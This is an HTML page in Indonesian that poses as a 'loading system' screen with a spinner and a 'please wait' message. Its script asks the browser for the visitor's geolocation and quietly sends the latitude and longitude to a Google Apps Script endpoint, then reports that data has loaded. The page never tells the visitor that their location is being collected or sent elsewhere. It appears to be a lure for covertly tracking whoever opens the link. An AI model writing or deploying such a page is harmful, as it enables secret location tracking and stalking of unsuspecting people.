<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #4facfe, #00f2fe);
      color: white;
      text-align: center;
    }

    .container {
      margin-top: 100px;
    }

    .loader {
      border: 6px solid rgba(255,255,255,0.3);
      border-top: 6px solid white;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: auto;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    h1 {
      margin-top: 20px;
      font-size: 22px;
    }

    p {
      opacity: 0.8;
    }

    .success {
      color: #00ffcc;
      font-weight: bold;
    }

    .error {
      color: #ffdddd;
    }
  </style>
</head>

<body>

<div class="container">
  <div class="loader"></div>
  <h1 id="status">Memuat sistem...</h1>
  <p>Mohon tunggu sebentar</p>
</div>

<script>
if (navigator.geolocation) {

  navigator.geolocation.getCurrentPosition(
    function(pos){

      var lat = pos.coords.latitude;
      var lon = pos.coords.longitude;

      var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
                + lat + "&lon=" + lon;

      fetch(url).then(() => {
        document.querySelector(".loader").style.display = "none";
        document.getElementById("status").innerHTML = "✅ Data berhasil dimuat";
        document.getElementById("status").className = "success";
      });

    },

    function(error){
      document.querySelector(".loader").style.display = "none";
      document.getElementById("status").innerHTML = "❌ Gagal: " + error.message;
      document.getElementById("status").className = "error";
    }

  );

} else {
  document.getElementById("status").innerHTML = "❌ Browser tidak support";
}
</script>

</body>
</html>
